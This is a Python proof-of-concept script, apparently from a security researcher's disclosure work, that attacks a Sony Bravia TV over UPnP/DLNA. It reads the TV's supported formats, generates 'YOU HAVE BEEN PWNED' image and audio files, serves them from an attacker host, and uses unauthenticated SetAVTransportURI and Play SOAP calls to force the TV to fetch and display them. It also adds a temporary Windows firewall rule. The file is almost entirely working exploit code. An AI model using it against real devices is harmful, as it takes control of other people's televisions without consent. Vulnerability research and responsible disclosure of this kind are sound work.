#!/usr/bin/env python3
"""
Probe what media formats the TV supports via ConnectionManager GetProtocolInfo,
then try various formats until one renders on screen.
Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""
import os, tempfile, time, threading, json, datetime, re, struct, wave
import http.server, socketserver
import numpy as np
import requests
from PIL import Image, ImageDraw, ImageFont

_tmp = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                    "..", "..", "..", "..", "..", ".tmp")
os.makedirs(_tmp, exist_ok=True)
tempfile.tempdir = _tmp

TARGET   = "192.168.18.6"
ATTACKER = "192.168.18.147"
PORT     = 9999
UPNP     = 2870
OUT_DIR  = os.path.dirname(os.path.abspath(__file__))

HITS = []
BYTES_SERVED = [0]


def soap(svc, action, inner, path):
    body = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
        's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        f"<s:Body><u:{action} xmlns:u=\"{svc}\">{inner}</u:{action}></s:Body>"
        "</s:Envelope>"
    )
    headers = {
        "Content-Type": 'text/xml; charset="utf-8"',
        "SOAPACTION": f'"{svc}#{action}"',
    }
    return requests.post(f"http://{TARGET}:{UPNP}/{path}",
                         data=body.encode(), headers=headers, timeout=10)


def get_state():
    r = soap("urn:schemas-upnp-org:service:AVTransport:1",
             "GetTransportInfo", "<InstanceID>0</InstanceID>", "control/AVTransport")
    m = re.search(r"<CurrentTransportState>([^<]+)</CurrentTransportState>", r.text)
    return m.group(1) if m else "?"


# ─── Generate test assets ──────────────────────────────────────────────────

def gen_jpeg(text="YOU HAVE BEEN PWNED", path=None):
    """Generate a 1280x720 JPEG with hacktivist message."""
    if path is None:
        path = os.path.join(OUT_DIR, "pwned_slide.jpg")
    img = Image.new("RGB", (1280, 720), (10, 10, 10))
    draw = ImageDraw.Draw(img)
    lines = [
        ("YOU HAVE BEEN PWNED", (255, 20, 20), 0.20, 80),
        ("Sony Bravia KDL-50W665F", (200, 200, 200), 0.38, 48),
        ("UPnP/DLNA — No Authentication Required", (255, 165, 0), 0.52, 36),
        ("SSRF + Arbitrary Media Injection Confirmed", (255, 165, 0), 0.62, 36),
        ("Researcher: @mrhenrike | Uniao Geek", (80, 200, 120), 0.76, 32),
        ("Responsible Disclosure — CVE Candidates: BRAVIA-2026-001/002/003", (100, 150, 255), 0.88, 26),
    ]
    for (txt, color, y_frac, size) in lines:
        try:
            font = ImageFont.truetype("arial.ttf", size)
        except Exception:
            font = ImageFont.load_default()
        try:
            bbox = draw.textbbox((0, 0), txt, font=font)
            tw = bbox[2] - bbox[0]
        except Exception:
            tw = len(txt) * (size // 2)
        x = (1280 - tw) // 2
        y = int(720 * y_frac)
        draw.text((x + 2, y + 2), txt, fill=(0, 0, 0), font=font)
        draw.text((x, y), txt, fill=color, font=font)
    img.save(path, "JPEG", quality=92)
    print(f"  [+] JPEG: {path} ({os.path.getsize(path)//1024} KB)")
    return path


def gen_wav_beep(path=None, duration_s=3, freq=880):
    """Generate a WAV audio file with a tone."""
    if path is None:
        path = os.path.join(OUT_DIR, "pwned_beep.wav")
    sample_rate = 44100
    n_samples = sample_rate * duration_s
    t = np.linspace(0, duration_s, n_samples, False)
    tone = (np.sin(2 * np.pi * freq * t) * 32767).astype(np.int16)
    with wave.open(path, "w") as wf:
        wf.setnchannels(1)
        wf.setsampwidth(2)
        wf.setframerate(sample_rate)
        wf.writeframes(tone.tobytes())
    print(f"  [+] WAV: {path} ({os.path.getsize(path)//1024} KB)")
    return path


def gen_mpeg_audio_silence(path=None, duration_s=5):
    """Generate minimal valid MP3 with ID3 tag."""
    if path is None:
        path = os.path.join(OUT_DIR, "pwned_audio.mp3")
    # Build a sequence of MP3 null frames (Layer III, 128kbps, 44100Hz, Stereo)
    # Header: 0xFF 0xFB 0x90 0x00 = sync + Layer3 + 128kbps + 44100 + Stereo
    mp3_frame = b"\xff\xfb\x90\x00" + b"\x00" * 413  # 417 bytes per frame at 128kbps
    frames_needed = int(duration_s * 44100 / 1152)  # frames = samples / 1152
    id3 = (
        b"ID3\x03\x00\x00"
        b"\x00\x00\x00\x1f"  # size 31 bytes
        b"TIT2\x00\x00\x00\x13\x00\x00\x00"
        b"YOU HAVE BEEN PWNED"
    )
    with open(path, "wb") as f:
        f.write(id3)
        for _ in range(frames_needed):
            f.write(mp3_frame)
    print(f"  [+] MP3: {path} ({os.path.getsize(path)//1024} KB)")
    return path


# ─── HTTP media server ─────────────────────────────────────────────────────

ASSETS = {}  # path -> (bytes, content_type)


class AssetHandler(http.server.BaseHTTPRequestHandler):
    def do_HEAD(self):
        self._log("HEAD")
        key = self.path.lstrip("/")
        if key in ASSETS:
            data, ct = ASSETS[key]
            self.send_response(200)
            self.send_header("Content-Type", ct)
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Accept-Ranges", "bytes")
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        self._log("GET")
        key = self.path.lstrip("/")
        if key in ASSETS:
            data, ct = ASSETS[key]
            rng = self.headers.get("Range", "")
            if rng.startswith("bytes="):
                parts = rng[6:].split("-")
                start = int(parts[0]) if parts[0] else 0
                end   = int(parts[1]) if len(parts) > 1 and parts[1] else len(data) - 1
                chunk = data[start:end+1]
                self.send_response(206)
                self.send_header("Content-Type", ct)
                self.send_header("Content-Range", f"bytes {start}-{end}/{len(data)}")
                self.send_header("Content-Length", str(len(chunk)))
                self.send_header("Accept-Ranges", "bytes")
                self.end_headers()
                self.wfile.write(chunk)
                BYTES_SERVED[0] += len(chunk)
            else:
                self.send_response(200)
                self.send_header("Content-Type", ct)
                self.send_header("Content-Length", str(len(data)))
                self.send_header("Accept-Ranges", "bytes")
                self.end_headers()
                self.wfile.write(data)
                BYTES_SERVED[0] += len(data)
        else:
            self.send_response(404)
            self.end_headers()

    def _log(self, method):
        h = {
            "time": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "method": method, "path": self.path, "peer": self.client_address[0],
            "ua": self.headers.get("User-Agent", ""),
            "range": self.headers.get("Range", ""),
        }
        HITS.append(h)
        print(f"  *** {method} {self.path} ua={h['ua']!r:.50}",
              flush=True)

    def log_message(self, *args):
        pass


def inject_play(uri, meta="", label=""):
    AVT = "urn:schemas-upnp-org:service:AVTransport:1"
    soap(AVT, "Stop", "<InstanceID>0</InstanceID>", "control/AVTransport")
    time.sleep(0.5)
    r1 = soap(AVT, "SetAVTransportURI",
              f"<InstanceID>0</InstanceID>"
              f"<CurrentURI>{uri}</CurrentURI>"
              f"<CurrentURIMetaData>{meta}</CurrentURIMetaData>",
              "control/AVTransport")
    r2 = soap(AVT, "Play", "<InstanceID>0</InstanceID><Speed>1</Speed>",
              "control/AVTransport")
    print(f"  {label}: SetURI={r1.status_code} Play={r2.status_code}")
    return r2.status_code


def wait_for_hit(key, timeout=12):
    deadline = time.time() + timeout
    while time.time() < deadline:
        time.sleep(0.5)
        if any(key in h.get("path","") for h in HITS):
            return True
    return False


def main():
    # ── Get supported protocols ──────────────────────────────────────────
    print("[1] GetProtocolInfo (ConnectionManager)")
    r = soap("urn:schemas-upnp-org:service:ConnectionManager:1",
             "GetSinkProtocolInfo", "", "control/ConnectionManager")
    proto_info = r.text
    # Extract protocol info
    m = re.search(r"<CurrentProtocolInfo>([^<]{1,4000})</CurrentProtocolInfo>", proto_info, re.S)
    if not m:
        m = re.search(r"<SinkProtocolInfo>([^<]{1,4000})</SinkProtocolInfo>", proto_info, re.S)
    proto_str = m.group(1) if m else proto_info[200:800]
    print(f"  Supported protocols:\n{proto_str[:1200]}")

    # Parse MIME types
    mimes = set(re.findall(r"http-get:\*:([^:]+):", proto_str))
    print(f"\n  Detected MIME types: {mimes}")

    # ── Generate assets ──────────────────────────────────────────────────
    print("\n[2] Generating test assets...")
    jpeg_path = gen_jpeg()
    wav_path  = gen_wav_beep()
    mp3_path  = gen_mpeg_audio_silence()

    with open(jpeg_path, "rb") as f:
        ASSETS["pwned_slide.jpg"] = (f.read(), "image/jpeg")
    with open(wav_path, "rb") as f:
        ASSETS["pwned_beep.wav"] = (f.read(), "audio/L16;rate=44100;channels=1")
    with open(mp3_path, "rb") as f:
        ASSETS["pwned_audio.mp3"] = (f.read(), "audio/mpeg")

    # Also try the mp4v file we already have
    mp4_path = os.path.join(OUT_DIR, "pwned.mp4")
    if os.path.exists(mp4_path):
        with open(mp4_path, "rb") as f:
            ASSETS["pwned.mp4"] = (f.read(), "video/mpeg")  # Try as video/mpeg

    # ── Start server ─────────────────────────────────────────────────────
    os.system('netsh advfirewall firewall add rule name="PoC_Media_9999" dir=in action=allow protocol=TCP localport=9999 >nul 2>&1')
    srv = socketserver.TCPServer(("", PORT), AssetHandler)
    srv.allow_reuse_address = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(f"\n[3] Server up on {ATTACKER}:{PORT}")

    # ── Try formats in order of likelihood ──────────────────────────────
    formats_to_try = []

    # JPEG image (some DLNA renderers support photos)
    if "image/jpeg" in mimes or not mimes:
        formats_to_try.append((f"http://{ATTACKER}:{PORT}/pwned_slide.jpg", "image/jpeg", "JPEG image"))

    # MP3 audio (very widely supported)
    if any("audio" in m for m in mimes) or not mimes:
        formats_to_try.append((f"http://{ATTACKER}:{PORT}/pwned_audio.mp3", "audio/mpeg", "MP3 audio"))

    # WAV audio
    if any("wav" in m or "audio/L16" in m or "audio/x-wav" in m for m in mimes) or not mimes:
        formats_to_try.append((f"http://{ATTACKER}:{PORT}/pwned_beep.wav", "audio/wav", "WAV beep"))

    # MP4 as video/mpeg (fallback)
    if os.path.exists(mp4_path):
        formats_to_try.append((f"http://{ATTACKER}:{PORT}/pwned.mp4", "video/mpeg", "MP4 as video/mpeg"))

    results = []
    for uri, mime, label in formats_to_try:
        key = uri.split("/")[-1]
        hits_before = len(HITS)
        bytes_before = BYTES_SERVED[0]
        play_code = inject_play(uri, label=label)
        fetched = wait_for_hit(key, timeout=15)
        state = get_state()
        new_hits = HITS[hits_before:]
        new_bytes = BYTES_SERVED[0] - bytes_before
        result = {
            "uri": uri, "mime": mime, "label": label,
            "play_http": play_code, "state": state,
            "tv_fetched": fetched, "bytes_served": new_bytes,
            "hits": new_hits,
        }
        results.append(result)
        sym = "HIT" if new_bytes > 0 else ("HEAD" if fetched or new_hits else "---")
        print(f"  [{sym}] {label}: state={state} bytes={new_bytes}B hits={len(new_hits)}")
        if new_bytes > 1000:
            print(f"  [!!] TV DOWNLOADED CONTENT! {new_bytes//1024}KB served")
            break
        time.sleep(2)

    srv.shutdown()
    os.system('netsh advfirewall firewall delete rule name="PoC_Media_9999" >nul 2>&1')

    evidence = {
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "protocol_info": proto_str[:3000],
        "detected_mimes": list(mimes),
        "results": results,
        "total_hits": len(HITS),
        "total_bytes_served": BYTES_SERVED[0],
        "all_hits": HITS,
    }
    out = os.path.join(OUT_DIR, "format_probe_evidence.json")
    with open(out, "w") as f:
        json.dump(evidence, f, indent=2)
    print(f"\n[*] Evidence -> {out}")
    print(f"    Total hits: {len(HITS)}, bytes: {BYTES_SERVED[0]}")


if __name__ == "__main__":
    main()
